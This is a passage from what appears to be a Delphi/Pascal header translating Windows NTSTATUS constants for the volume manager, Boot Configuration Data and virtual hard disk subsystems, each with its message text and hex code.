// One or more disks were not fully migrated to the target pack. They may or may not require reimport after fixing the hardware problems.
//
STATUS_VOLMGR_INCOMPLETE_DISK_MIGRATION = NTSTATUS($80380002);

//
// ERRORS
//
//
// MessageId: STATUS_VOLMGR_DATABASE_FULL
//
// MessageText:
//
// The configuration database is full.
//
STATUS_VOLMGR_DATABASE_FULL      = NTSTATUS($C0380001);

//
// MessageId: STATUS_VOLMGR_DISK_CONFIGURATION_CORRUPTED
//
// MessageText:
//
// The configuration data on the disk is corrupted.
//
STATUS_VOLMGR_DISK_CONFIGURATION_CORRUPTED = NTSTATUS($C0380002);

//
// MessageId: STATUS_VOLMGR_DISK_CONFIGURATION_NOT_IN_SYNC
//
// MessageText:
//
// The configuration on the disk is not insync with the in-memory configuration.
//
STATUS_VOLMGR_DISK_CONFIGURATION_NOT_IN_SYNC = NTSTATUS($C0380003);

//
// MessageId: STATUS_VOLMGR_PACK_CONFIG_UPDATE_FAILED
//
// MessageText:
//
// A majority of disks failed to be updated with the new configuration.
//
STATUS_VOLMGR_PACK_CONFIG_UPDATE_FAILED = NTSTATUS($C0380004);

//
// MessageId: STATUS_VOLMGR_DISK_CONTAINS_NON_SIMPLE_VOLUME
//
// MessageText:
//
// The disk contains non-simple volumes.
//
STATUS_VOLMGR_DISK_CONTAINS_NON_SIMPLE_VOLUME = NTSTATUS($C0380005);

//
// MessageId: STATUS_VOLMGR_DISK_DUPLICATE
//
// MessageText:
//
// The same disk was specified more than once in the migration list.
//
STATUS_VOLMGR_DISK_DUPLICATE     = NTSTATUS($C0380006);

//
// MessageId: STATUS_VOLMGR_DISK_DYNAMIC
//
// MessageText:
//
// The disk is already dynamic.
//
STATUS_VOLMGR_DISK_DYNAMIC       = NTSTATUS($C0380007);

//
// MessageId: STATUS_VOLMGR_DISK_ID_INVALID
//
// MessageText:
//
// The specified disk id is invalid. There are no disks with the specified disk id.
//
STATUS_VOLMGR_DISK_ID_INVALID    = NTSTATUS($C0380008);

//
// MessageId: STATUS_VOLMGR_DISK_INVALID
//
// MessageText:
//
// The specified disk is an invalid disk. Operation cannot complete on an invalid disk.
//
STATUS_VOLMGR_DISK_INVALID       = NTSTATUS($C0380009);

//
// MessageId: STATUS_VOLMGR_DISK_LAST_VOTER
//
// MessageText:
//
// The specified disk(s) cannot be removed since it is the last remaining voter.
//
STATUS_VOLMGR_DISK_LAST_VOTER    = NTSTATUS($C038000A);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_INVALID
//
// MessageText:
//
// The specified disk has an invalid disk layout.
//
STATUS_VOLMGR_DISK_LAYOUT_INVALID = NTSTATUS($C038000B);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_NON_BASIC_BETWEEN_BASIC_PARTITIONS
//
// MessageText:
//
// The disk layout contains non-basic partitions which appear after basic partitions. This is an invalid disk layout.
//
STATUS_VOLMGR_DISK_LAYOUT_NON_BASIC_BETWEEN_BASIC_PARTITIONS = NTSTATUS($C038000C);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_NOT_CYLINDER_ALIGNED
//
// MessageText:
//
// The disk layout contains partitions which are not cylinder aligned.
//
STATUS_VOLMGR_DISK_LAYOUT_NOT_CYLINDER_ALIGNED = NTSTATUS($C038000D);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_PARTITIONS_TOO_SMALL
//
// MessageText:
//
// The disk layout contains partitions which are smaller than the minimum size.
//
STATUS_VOLMGR_DISK_LAYOUT_PARTITIONS_TOO_SMALL = NTSTATUS($C038000E);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_PRIMARY_BETWEEN_LOGICAL_PARTITIONS
//
// MessageText:
//
// The disk layout contains primary partitions in between logical drives. This is an invalid disk layout.
//
STATUS_VOLMGR_DISK_LAYOUT_PRIMARY_BETWEEN_LOGICAL_PARTITIONS = NTSTATUS($C038000F);

//
// MessageId: STATUS_VOLMGR_DISK_LAYOUT_TOO_MANY_PARTITIONS
//
// MessageText:
//
// The disk layout contains more than the maximum number of supported partitions.
//
STATUS_VOLMGR_DISK_LAYOUT_TOO_MANY_PARTITIONS = NTSTATUS($C0380010);

//
// MessageId: STATUS_VOLMGR_DISK_MISSING
//
// MessageText:
//
// The specified disk is missing. The operation cannot complete on a missing disk.
//
STATUS_VOLMGR_DISK_MISSING       = NTSTATUS($C0380011);

//
// MessageId: STATUS_VOLMGR_DISK_NOT_EMPTY
//
// MessageText:
//
// The specified disk is not empty.
//
STATUS_VOLMGR_DISK_NOT_EMPTY     = NTSTATUS($C0380012);

//
// MessageId: STATUS_VOLMGR_DISK_NOT_ENOUGH_SPACE
//
// MessageText:
//
// There is not enough usable space for this operation.
//
STATUS_VOLMGR_DISK_NOT_ENOUGH_SPACE = NTSTATUS($C0380013);

//
// MessageId: STATUS_VOLMGR_DISK_REVECTORING_FAILED
//
// MessageText:
//
// The force revectoring of bad sectors failed.
//
STATUS_VOLMGR_DISK_REVECTORING_FAILED = NTSTATUS($C0380014);

//
// MessageId: STATUS_VOLMGR_DISK_SECTOR_SIZE_INVALID
//
// MessageText:
//
// The specified disk has an invalid sector size.
//
STATUS_VOLMGR_DISK_SECTOR_SIZE_INVALID = NTSTATUS($C0380015);

//
// MessageId: STATUS_VOLMGR_DISK_SET_NOT_CONTAINED
//
// MessageText:
//
// The specified disk set contains volumes which exist on disks outside of the set.
//
STATUS_VOLMGR_DISK_SET_NOT_CONTAINED = NTSTATUS($C0380016);

//
// MessageId: STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_MEMBERS
//
// MessageText:
//
// A disk in the volume layout provides extents to more than one member of a plex.
//
STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_MEMBERS = NTSTATUS($C0380017);

//
// MessageId: STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_PLEXES
//
// MessageText:
//
// A disk in the volume layout provides extents to more than one plex.
//
STATUS_VOLMGR_DISK_USED_BY_MULTIPLE_PLEXES = NTSTATUS($C0380018);

//
// MessageId: STATUS_VOLMGR_DYNAMIC_DISK_NOT_SUPPORTED
//
// MessageText:
//
// Dynamic disks are not supported on this system.
//
STATUS_VOLMGR_DYNAMIC_DISK_NOT_SUPPORTED = NTSTATUS($C0380019);

//
// MessageId: STATUS_VOLMGR_EXTENT_ALREADY_USED
//
// MessageText:
//
// The specified extent is already used by other volumes.
//
STATUS_VOLMGR_EXTENT_ALREADY_USED = NTSTATUS($C038001A);

//
// MessageId: STATUS_VOLMGR_EXTENT_NOT_CONTIGUOUS
//
// MessageText:
//
// The specified volume is retained and can only be extended into a contiguous extent. The specified extent to grow the volume is not contiguous with the specified volume.
//
STATUS_VOLMGR_EXTENT_NOT_CONTIGUOUS = NTSTATUS($C038001B);

//
// MessageId: STATUS_VOLMGR_EXTENT_NOT_IN_PUBLIC_REGION
//
// MessageText:
//
// The specified volume extent is not within the public region of the disk.
//
STATUS_VOLMGR_EXTENT_NOT_IN_PUBLIC_REGION = NTSTATUS($C038001C);

//
// MessageId: STATUS_VOLMGR_EXTENT_NOT_SECTOR_ALIGNED
//
// MessageText:
//
// The specified volume extent is not sector aligned.
//
STATUS_VOLMGR_EXTENT_NOT_SECTOR_ALIGNED = NTSTATUS($C038001D);

//
// MessageId: STATUS_VOLMGR_EXTENT_OVERLAPS_EBR_PARTITION
//
// MessageText:
//
// The specified partition overlaps an EBR (the first track of an extended partition on a MBR disks).
//
STATUS_VOLMGR_EXTENT_OVERLAPS_EBR_PARTITION = NTSTATUS($C038001E);

//
// MessageId: STATUS_VOLMGR_EXTENT_VOLUME_LENGTHS_DO_NOT_MATCH
//
// MessageText:
//
// The specified extent lengths cannot be used to construct a volume with specified length.
//
STATUS_VOLMGR_EXTENT_VOLUME_LENGTHS_DO_NOT_MATCH = NTSTATUS($C038001F);

//
// MessageId: STATUS_VOLMGR_FAULT_TOLERANT_NOT_SUPPORTED
//
// MessageText:
//
// The system does not support fault tolerant volumes.
//
STATUS_VOLMGR_FAULT_TOLERANT_NOT_SUPPORTED = NTSTATUS($C0380020);

//
// MessageId: STATUS_VOLMGR_INTERLEAVE_LENGTH_INVALID
//
// MessageText:
//
// The specified interleave length is invalid.
//
STATUS_VOLMGR_INTERLEAVE_LENGTH_INVALID = NTSTATUS($C0380021);

//
// MessageId: STATUS_VOLMGR_MAXIMUM_REGISTERED_USERS
//
// MessageText:
//
// There is already a maximum number of registered users.
//
STATUS_VOLMGR_MAXIMUM_REGISTERED_USERS = NTSTATUS($C0380022);

//
// MessageId: STATUS_VOLMGR_MEMBER_IN_SYNC
//
// MessageText:
//
// The specified member is already in-sync with the other active members. It does not need to be regenerated.
//
STATUS_VOLMGR_MEMBER_IN_SYNC     = NTSTATUS($C0380023);

//
// MessageId: STATUS_VOLMGR_MEMBER_INDEX_DUPLICATE
//
// MessageText:
//
// The same member index was specified more than once.
//
STATUS_VOLMGR_MEMBER_INDEX_DUPLICATE = NTSTATUS($C0380024);

//
// MessageId: STATUS_VOLMGR_MEMBER_INDEX_INVALID
//
// MessageText:
//
// The specified member index is greater or equal than the number of members in the volume plex.
//
STATUS_VOLMGR_MEMBER_INDEX_INVALID = NTSTATUS($C0380025);

//
// MessageId: STATUS_VOLMGR_MEMBER_MISSING
//
// MessageText:
//
// The specified member is missing. It cannot be regenerated.
//
STATUS_VOLMGR_MEMBER_MISSING     = NTSTATUS($C0380026);

//
// MessageId: STATUS_VOLMGR_MEMBER_NOT_DETACHED
//
// MessageText:
//
// The specified member is not detached. Cannot replace a member which is not detached.
//
STATUS_VOLMGR_MEMBER_NOT_DETACHED = NTSTATUS($C0380027);

//
// MessageId: STATUS_VOLMGR_MEMBER_REGENERATING
//
// MessageText:
//
// The specified member is already regenerating.
//
STATUS_VOLMGR_MEMBER_REGENERATING = NTSTATUS($C0380028);

//
// MessageId: STATUS_VOLMGR_ALL_DISKS_FAILED
//
// MessageText:
//
// All disks belonging to the pack failed.
//
STATUS_VOLMGR_ALL_DISKS_FAILED   = NTSTATUS($C0380029);

//
// MessageId: STATUS_VOLMGR_NO_REGISTERED_USERS
//
// MessageText:
//
// There are currently no registered users for notifications. The task number is irrelevant unless there are registered users.
//
STATUS_VOLMGR_NO_REGISTERED_USERS = NTSTATUS($C038002A);

//
// MessageId: STATUS_VOLMGR_NO_SUCH_USER
//
// MessageText:
//
// The specified notification user does not exist. Failed to unregister user for notifications.
//
STATUS_VOLMGR_NO_SUCH_USER       = NTSTATUS($C038002B);

//
// MessageId: STATUS_VOLMGR_NOTIFICATION_RESET
//
// MessageText:
//
// The notifications have been reset. Notifications for the current user are invalid. Unregister and re-register for notifications.
//
STATUS_VOLMGR_NOTIFICATION_RESET = NTSTATUS($C038002C);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_MEMBERS_INVALID
//
// MessageText:
//
// The specified number of members is invalid.
//
STATUS_VOLMGR_NUMBER_OF_MEMBERS_INVALID = NTSTATUS($C038002D);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_PLEXES_INVALID
//
// MessageText:
//
// The specified number of plexes is invalid.
//
STATUS_VOLMGR_NUMBER_OF_PLEXES_INVALID = NTSTATUS($C038002E);

//
// MessageId: STATUS_VOLMGR_PACK_DUPLICATE
//
// MessageText:
//
// The specified source and target packs are identical.
//
STATUS_VOLMGR_PACK_DUPLICATE     = NTSTATUS($C038002F);

//
// MessageId: STATUS_VOLMGR_PACK_ID_INVALID
//
// MessageText:
//
// The specified pack id is invalid. There are no packs with the specified pack id.
//
STATUS_VOLMGR_PACK_ID_INVALID    = NTSTATUS($C0380030);

//
// MessageId: STATUS_VOLMGR_PACK_INVALID
//
// MessageText:
//
// The specified pack is the invalid pack. The operation cannot complete with the invalid pack.
//
STATUS_VOLMGR_PACK_INVALID       = NTSTATUS($C0380031);

//
// MessageId: STATUS_VOLMGR_PACK_NAME_INVALID
//
// MessageText:
//
// The specified pack name is invalid.
//
STATUS_VOLMGR_PACK_NAME_INVALID  = NTSTATUS($C0380032);

//
// MessageId: STATUS_VOLMGR_PACK_OFFLINE
//
// MessageText:
//
// The specified pack is offline.
//
STATUS_VOLMGR_PACK_OFFLINE       = NTSTATUS($C0380033);

//
// MessageId: STATUS_VOLMGR_PACK_HAS_QUORUM
//
// MessageText:
//
// The specified pack already has a quorum of healthy disks.
//
STATUS_VOLMGR_PACK_HAS_QUORUM    = NTSTATUS($C0380034);

//
// MessageId: STATUS_VOLMGR_PACK_WITHOUT_QUORUM
//
// MessageText:
//
// The pack does not have a quorum of healthy disks.
//
STATUS_VOLMGR_PACK_WITHOUT_QUORUM = NTSTATUS($C0380035);

//
// MessageId: STATUS_VOLMGR_PARTITION_STYLE_INVALID
//
// MessageText:
//
// The specified disk has an unsupported partition style. Only MBR and GPT partition styles are supported.
//
STATUS_VOLMGR_PARTITION_STYLE_INVALID = NTSTATUS($C0380036);

//
// MessageId: STATUS_VOLMGR_PARTITION_UPDATE_FAILED
//
// MessageText:
//
// Failed to update the disk's partition layout.
//
STATUS_VOLMGR_PARTITION_UPDATE_FAILED = NTSTATUS($C0380037);

//
// MessageId: STATUS_VOLMGR_PLEX_IN_SYNC
//
// MessageText:
//
// The specified plex is already in-sync with the other active plexes. It does not need to be regenerated.
//
STATUS_VOLMGR_PLEX_IN_SYNC       = NTSTATUS($C0380038);

//
// MessageId: STATUS_VOLMGR_PLEX_INDEX_DUPLICATE
//
// MessageText:
//
// The same plex index was specified more than once.
//
STATUS_VOLMGR_PLEX_INDEX_DUPLICATE = NTSTATUS($C0380039);

//
// MessageId: STATUS_VOLMGR_PLEX_INDEX_INVALID
//
// MessageText:
//
// The specified plex index is greater or equal than the number of plexes in the volume.
//
STATUS_VOLMGR_PLEX_INDEX_INVALID = NTSTATUS($C038003A);

//
// MessageId: STATUS_VOLMGR_PLEX_LAST_ACTIVE
//
// MessageText:
//
// The specified plex is the last active plex in the volume. The plex cannot be removed or else the volume will go offline.
//
STATUS_VOLMGR_PLEX_LAST_ACTIVE   = NTSTATUS($C038003B);

//
// MessageId: STATUS_VOLMGR_PLEX_MISSING
//
// MessageText:
//
// The specified plex is missing.
//
STATUS_VOLMGR_PLEX_MISSING       = NTSTATUS($C038003C);

//
// MessageId: STATUS_VOLMGR_PLEX_REGENERATING
//
// MessageText:
//
// The specified plex is currently regenerating.
//
STATUS_VOLMGR_PLEX_REGENERATING  = NTSTATUS($C038003D);

//
// MessageId: STATUS_VOLMGR_PLEX_TYPE_INVALID
//
// MessageText:
//
// The specified plex type is invalid.
//
STATUS_VOLMGR_PLEX_TYPE_INVALID  = NTSTATUS($C038003E);

//
// MessageId: STATUS_VOLMGR_PLEX_NOT_RAID5
//
// MessageText:
//
// The operation is only supported on RAID-5 plexes.
//
STATUS_VOLMGR_PLEX_NOT_RAID5     = NTSTATUS($C038003F);

//
// MessageId: STATUS_VOLMGR_PLEX_NOT_SIMPLE
//
// MessageText:
//
// The operation is only supported on simple plexes.
//
STATUS_VOLMGR_PLEX_NOT_SIMPLE    = NTSTATUS($C0380040);

//
// MessageId: STATUS_VOLMGR_STRUCTURE_SIZE_INVALID
//
// MessageText:
//
// The Size fields in the VM_VOLUME_LAYOUT input structure are incorrectly set.
//
STATUS_VOLMGR_STRUCTURE_SIZE_INVALID = NTSTATUS($C0380041);

//
// MessageId: STATUS_VOLMGR_TOO_MANY_NOTIFICATION_REQUESTS
//
// MessageText:
//
// There is already a pending request for notifications. Wait for the existing request to return before requesting for more notifications.
//
STATUS_VOLMGR_TOO_MANY_NOTIFICATION_REQUESTS = NTSTATUS($C0380042);

//
// MessageId: STATUS_VOLMGR_TRANSACTION_IN_PROGRESS
//
// MessageText:
//
// There is currently a transaction in process.
//
STATUS_VOLMGR_TRANSACTION_IN_PROGRESS = NTSTATUS($C0380043);

//
// MessageId: STATUS_VOLMGR_UNEXPECTED_DISK_LAYOUT_CHANGE
//
// MessageText:
//
// An unexpected layout change occurred outside of the volume manager.
//
STATUS_VOLMGR_UNEXPECTED_DISK_LAYOUT_CHANGE = NTSTATUS($C0380044);

//
// MessageId: STATUS_VOLMGR_VOLUME_CONTAINS_MISSING_DISK
//
// MessageText:
//
// The specified volume contains a missing disk.
//
STATUS_VOLMGR_VOLUME_CONTAINS_MISSING_DISK = NTSTATUS($C0380045);

//
// MessageId: STATUS_VOLMGR_VOLUME_ID_INVALID
//
// MessageText:
//
// The specified volume id is invalid. There are no volumes with the specified volume id.
//
STATUS_VOLMGR_VOLUME_ID_INVALID  = NTSTATUS($C0380046);

//
// MessageId: STATUS_VOLMGR_VOLUME_LENGTH_INVALID
//
// MessageText:
//
// The specified volume length is invalid.
//
STATUS_VOLMGR_VOLUME_LENGTH_INVALID = NTSTATUS($C0380047);

//
// MessageId: STATUS_VOLMGR_VOLUME_LENGTH_NOT_SECTOR_SIZE_MULTIPLE
//
// MessageText:
//
// The specified size for the volume is not a multiple of the sector size.
//
STATUS_VOLMGR_VOLUME_LENGTH_NOT_SECTOR_SIZE_MULTIPLE = NTSTATUS($C0380048);

//
// MessageId: STATUS_VOLMGR_VOLUME_NOT_MIRRORED
//
// MessageText:
//
// The operation is only supported on mirrored volumes.
//
STATUS_VOLMGR_VOLUME_NOT_MIRRORED = NTSTATUS($C0380049);

//
// MessageId: STATUS_VOLMGR_VOLUME_NOT_RETAINED
//
// MessageText:
//
// The specified volume does not have a retain partition.
//
STATUS_VOLMGR_VOLUME_NOT_RETAINED = NTSTATUS($C038004A);

//
// MessageId: STATUS_VOLMGR_VOLUME_OFFLINE
//
// MessageText:
//
// The specified volume is offline.
//
STATUS_VOLMGR_VOLUME_OFFLINE     = NTSTATUS($C038004B);

//
// MessageId: STATUS_VOLMGR_VOLUME_RETAINED
//
// MessageText:
//
// The specified volume already has a retain partition.
//
STATUS_VOLMGR_VOLUME_RETAINED    = NTSTATUS($C038004C);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_EXTENTS_INVALID
//
// MessageText:
//
// The specified number of extents is invalid.
//
STATUS_VOLMGR_NUMBER_OF_EXTENTS_INVALID = NTSTATUS($C038004D);

//
// MessageId: STATUS_VOLMGR_DIFFERENT_SECTOR_SIZE
//
// MessageText:
//
// All disks participating to the volume must have the same sector size.
//
STATUS_VOLMGR_DIFFERENT_SECTOR_SIZE = NTSTATUS($C038004E);

//
// MessageId: STATUS_VOLMGR_BAD_BOOT_DISK
//
// MessageText:
//
// The boot disk experienced failures.
//
STATUS_VOLMGR_BAD_BOOT_DISK      = NTSTATUS($C038004F);

//
// MessageId: STATUS_VOLMGR_PACK_CONFIG_OFFLINE
//
// MessageText:
//
// The configuration of the pack is offline.
//
STATUS_VOLMGR_PACK_CONFIG_OFFLINE = NTSTATUS($C0380050);

//
// MessageId: STATUS_VOLMGR_PACK_CONFIG_ONLINE
//
// MessageText:
//
// The configuration of the pack is online.
//
STATUS_VOLMGR_PACK_CONFIG_ONLINE = NTSTATUS($C0380051);

//
// MessageId: STATUS_VOLMGR_NOT_PRIMARY_PACK
//
// MessageText:
//
// The specified pack is not the primary pack.
//
STATUS_VOLMGR_NOT_PRIMARY_PACK   = NTSTATUS($C0380052);

//
// MessageId: STATUS_VOLMGR_PACK_LOG_UPDATE_FAILED
//
// MessageText:
//
// All disks failed to be updated with the new content of the log.
//
STATUS_VOLMGR_PACK_LOG_UPDATE_FAILED = NTSTATUS($C0380053);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_DISKS_IN_PLEX_INVALID
//
// MessageText:
//
// The specified number of disks in a plex is invalid.
//
STATUS_VOLMGR_NUMBER_OF_DISKS_IN_PLEX_INVALID = NTSTATUS($C0380054);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_DISKS_IN_MEMBER_INVALID
//
// MessageText:
//
// The specified number of disks in a plex member is invalid.
//
STATUS_VOLMGR_NUMBER_OF_DISKS_IN_MEMBER_INVALID = NTSTATUS($C0380055);

//
// MessageId: STATUS_VOLMGR_VOLUME_MIRRORED
//
// MessageText:
//
// The operation is not supported on mirrored volumes.
//
STATUS_VOLMGR_VOLUME_MIRRORED    = NTSTATUS($C0380056);

//
// MessageId: STATUS_VOLMGR_PLEX_NOT_SIMPLE_SPANNED
//
// MessageText:
//
// The operation is only supported on simple and spanned plexes.
//
STATUS_VOLMGR_PLEX_NOT_SIMPLE_SPANNED = NTSTATUS($C0380057);

//
// MessageId: STATUS_VOLMGR_NO_VALID_LOG_COPIES
//
// MessageText:
//
// The pack has no valid log copies.
//
STATUS_VOLMGR_NO_VALID_LOG_COPIES = NTSTATUS($C0380058);

//
// MessageId: STATUS_VOLMGR_PRIMARY_PACK_PRESENT
//
// MessageText:
//
// A primary pack is already present.
//
STATUS_VOLMGR_PRIMARY_PACK_PRESENT = NTSTATUS($C0380059);

//
// MessageId: STATUS_VOLMGR_NUMBER_OF_DISKS_INVALID
//
// MessageText:
//
// The specified number of disks is invalid.
//
STATUS_VOLMGR_NUMBER_OF_DISKS_INVALID = NTSTATUS($C038005A);

//
// MessageId: STATUS_VOLMGR_MIRROR_NOT_SUPPORTED
//
// MessageText:
//
// The system does not support mirrored volumes.
//
STATUS_VOLMGR_MIRROR_NOT_SUPPORTED = NTSTATUS($C038005B);

//
// MessageId: STATUS_VOLMGR_RAID5_NOT_SUPPORTED
//
// MessageText:
//
// The system does not support RAID-5 volumes.
//
STATUS_VOLMGR_RAID5_NOT_SUPPORTED = NTSTATUS($C038005C);

//
// Boot Code Data (BCD) status codes
//

//
// MessageId: STATUS_BCD_NOT_ALL_ENTRIES_IMPORTED
//
// MessageText:
//
// Some BCD entries were not imported correctly from the BCD store.
//
STATUS_BCD_NOT_ALL_ENTRIES_IMPORTED = NTSTATUS($80390001);

//
// MessageId: STATUS_BCD_TOO_MANY_ELEMENTS
//
// MessageText:
//
// Entries enumerated have exceeded the allowed threshold.
//
STATUS_BCD_TOO_MANY_ELEMENTS     = NTSTATUS($C0390002);

//
// MessageId: STATUS_BCD_NOT_ALL_ENTRIES_SYNCHRONIZED
//
// MessageText:
//
// Some BCD entries were not synchronized correctly with the firmware.
//
STATUS_BCD_NOT_ALL_ENTRIES_SYNCHRONIZED = NTSTATUS($80390003);


//
// vhdparser error codes (vhdmp.sys)
//

//
// MessageId: STATUS_VHD_DRIVE_FOOTER_MISSING
//
// MessageText:
//
// The virtual hard disk is corrupted. The virtual hard disk drive footer is missing.
//
STATUS_VHD_DRIVE_FOOTER_MISSING  = NTSTATUS($C03A0001);

//
// MessageId: STATUS_VHD_DRIVE_FOOTER_CHECKSUM_MISMATCH
//
// MessageText:
//
// The virtual hard disk is corrupted. The virtual hard disk drive footer checksum does not match the on-disk checksum.
//
STATUS_VHD_DRIVE_FOOTER_CHECKSUM_MISMATCH = NTSTATUS($C03A0002);

//
// MessageId: STATUS_VHD_DRIVE_FOOTER_CORRUPT
//
// MessageText:
//
// The virtual hard disk is corrupted. The virtual hard disk drive footer in the virtual hard disk is corrupted.
//
STATUS_VHD_DRIVE_FOOTER_CORRUPT  = NTSTATUS($C03A0003);

//
// MessageId: STATUS_VHD_FORMAT_UNKNOWN
//
// MessageText:
//
// The system does not recognize the file format of this virtual hard disk.
//
STATUS_VHD_FORMAT_UNKNOWN        = NTSTATUS($C03A0004);

//
// MessageId: STATUS_VHD_FORMAT_UNSUPPORTED_VERSION
//
// MessageText:
//
// The version does not support this version of the file format.
//
STATUS_VHD_FORMAT_UNSUPPORTED_VERSION = NTSTATUS($C03A0005);

//
// MessageId: STATUS_VHD_SPARSE_HEADER_CHECKSUM_MISMATCH
//
// MessageText:
//
// The virtual hard disk is corrupted. The sparse header checksum does not match the on-disk checksum.
//
STATUS_VHD_SPARSE_HEADER_CHECKSUM_MISMATCH = NTSTATUS($C03A0006);

//
// MessageId: STATUS_VHD_SPARSE_HEADER_UNSUPPORTED_VERSION
//
// MessageText:
//
// The system does not support this version of the virtual hard disk.This version of the sparse header is not supported.
//
STATUS_VHD_SPARSE_HEADER_UNSUPPORTED_VERSION = NTSTATUS($C03A0007);

//
// MessageId: STATUS_VHD_SPARSE_HEADER_CORRUPT
//
// MessageText:
//
// The virtual hard disk is corrupted. The sparse header in the virtual hard disk is corrupt.
//
STATUS_VHD_SPARSE_HEADER_CORRUPT = NTSTATUS($C03A0008);

//
// MessageId: STATUS_VHD_BLOCK_ALLOCATION_FAILURE
//
// MessageText:
//
// Failed to write to the virtual hard disk failed because the system failed to allocate a new block in the virtual hard disk.
//
STATUS_VHD_BLOCK_ALLOCATION_FAILURE = NTSTATUS($C03A0009);

//
// MessageId: STATUS_VHD_BLOCK_ALLOCATION_TABLE_CORRUPT
//
// MessageText:
//
// The virtual hard disk is corrupted. The block allocation table in the virtual hard disk is corrupt.
//
STATUS_VHD_BLOCK_ALLOCATION_TABLE_CORRUPT = NTSTATUS($C03A000A);

//
// MessageId: STATUS_VHD_INVALID_BLOCK_SIZE
//
// MessageText:
//
// The system does not support this version of the virtual hard disk. The block size is invalid.
//
STATUS_VHD_INVALID_BLOCK_SIZE    = NTSTATUS($C03A000B);

//
// MessageId: STATUS_VHD_BITMAP_MISMATCH
//
// MessageText:
//
// The virtual hard disk is corrupted. The block bitmap does not match with the block data present in the virtual hard disk.
//
STATUS_VHD_BITMAP_MISMATCH       = NTSTATUS($C03A000C);

//
// MessageId: STATUS_VHD_PARENT_VHD_NOT_FOUND
//
// MessageText:
//
// The chain of virtual hard disks is broken. The system cannot locate the parent virtual hard disk for the differencing disk.
//
STATUS_VHD_PARENT_VHD_NOT_FOUND  = NTSTATUS($C03A000D);

//
// MessageId: STATUS_VHD_CHILD_PARENT_ID_MISMATCH
//
// MessageText:
//
// The chain of virtual hard disks is corrupted. There is a mismatch in the identifiers of the parent virtual hard disk and differencing disk.
//
STATUS_VHD_CHILD_PARENT_ID_MISMATCH = NTSTATUS($C03A000E);

//
// MessageId: STATUS_VHD_CHILD_PARENT_TIMESTAMP_MISMATCH
//
// MessageText:
//
// The chain of virtual hard disks is corrupted. The time stamp of the parent virtual hard disk does not match the time stamp of the differencing disk.
//
STATUS_VHD_CHILD_PARENT_TIMESTAMP_MISMATCH = NTSTATUS($C03A000F);

//
// MessageId: STATUS_VHD_METADATA_READ_FAILURE
//
// MessageText:
//
// Failed to read the metadata of the virtual hard disk.
//
STATUS_VHD_METADATA_READ_FAILURE = NTSTATUS($C03A0010);

//
// MessageId: STATUS_VHD_METADATA_WRITE_FAILURE
//
// MessageText:
//
// Failed to write to the metadata of the virtual hard disk.
//
STATUS_VHD_METADATA_WRITE_FAILURE = NTSTATUS($C03A0011);

//
// MessageId: STATUS_VHD_INVALID_SIZE
//
// MessageText:
//
// The size of the virtual hard disk is not valid.
//
STATUS_VHD_INVALID_SIZE          = NTSTATUS($C03A0012);

//
// MessageId: STATUS_VHD_INVALID_FILE_SIZE
//
// MessageText:
//
// The file size of this virtual hard disk is not valid.
//
STATUS_VHD_INVALID_FILE_SIZE     = NTSTATUS($C03A0013);

//
// MessageId: STATUS_VIRTDISK_PROVIDER_NOT_FOUND
//
// MessageText:
//
// A virtual disk support provider for the specified file was not found.
//
STATUS_VIRTDISK_PROVIDER_NOT_FOUND = NTSTATUS($C03A0014);

//
// MessageId: STATUS_VIRTDISK_NOT_VIRTUAL_DISK
//
// MessageText:
//
// The specified disk is not a virtual disk.
//
STATUS_VIRTDISK_NOT_VIRTUAL_DISK = NTSTATUS($C03A0015);

//
// MessageId: STATUS_VHD_PARENT_VHD_ACCESS_DENIED
//
// MessageText:
//
// The chain of virtual hard disks is inaccessible. The process has not been granted access rights to the parent virtual hard disk for the differencing disk.
//
STATUS_VHD_PARENT_VHD_ACCESS_DENIED = NTSTATUS($C03A0016);

//
// MessageId: STATUS_VHD_CHILD_PARENT_SIZE_MISMATCH
//
// MessageText:
//
// The chain of virtual hard disks is corrupted. There is a mismatch in the virtual sizes of the parent virtual hard disk and differencing disk.
//
STATUS_VHD_CHILD_PARENT_SIZE_MISMATCH = NTSTATUS($C03A0017);

//
// MessageId: STATUS_VHD_DIFFERENCING_CHAIN_CYCLE_DETECTED
//
// MessageText:
//
// The chain of virtual hard disks is corrupted. A differencing disk is indicated in its own parent chain.
//
STATUS_VHD_DIFFERENCING_CHAIN_CYCLE_DETECTED = NTSTATUS($C03A0018);

//
// MessageId: STATUS_VHD_DIFFERENCING_CHAIN_ERROR_IN_PARENT
//
// MessageText:
//
// The chain of virtual hard disks is inaccessible. There was an error opening a virtual hard disk further up the chain.
//
STATUS_VHD_DIFFERENCING_CHAIN_ERROR_IN_PARENT = NTSTATUS($C03A0019);

//
// MessageId: STATUS_VIRTUAL_DISK_LIMITATION
//
// MessageText:
//
// The requested operation could not be completed due to a virtual disk system limitation.  Virtual hard disk files must be uncompressed and unencrypted and must not be sparse.
//
STATUS_VIRTUAL_DISK_LIMITATION   = NTSTATUS($C03A001A);

//
// MessageId: STATUS_VHD_INVALID_TYPE
//
// MessageText:
//
// The requested operation cannot be performed on a virtual disk of this type.
//
STATUS_VHD_INVALID_TYPE          = NTSTATUS($C03A001B);

//
// MessageId: STATUS_VHD_INVALID_STATE
//
// MessageText:
//
// The requested operation cannot be performed on the virtual disk in its current state.
//
STATUS_VHD_INVALID_STATE         = NTSTATUS($C03A001C);

//
// MessageId: STATUS_VIRTDISK_UNSUPPORTED_DISK_SECTOR_SIZE
//
// MessageText:
//
// The sector size of the physical disk on which the virtual disk resides is not supported.
//
STATUS_VIRTDISK_UNSUPPORTED_DISK_SECTOR_SIZE = NTSTATUS($C03A001D);

//
// MessageId: STATUS_VIRTDISK_DISK_ALREADY_OWNED
//
// MessageText:
//
// The disk is already owned by a different owner.
//
STATUS_VIRTDISK_DISK_ALREADY_OWNED = NTSTATUS($C03A001E);

//
// MessageId: STATUS_VIRTDISK_DISK_ONLINE_AND_WRITABLE
//
// MessageText:
//
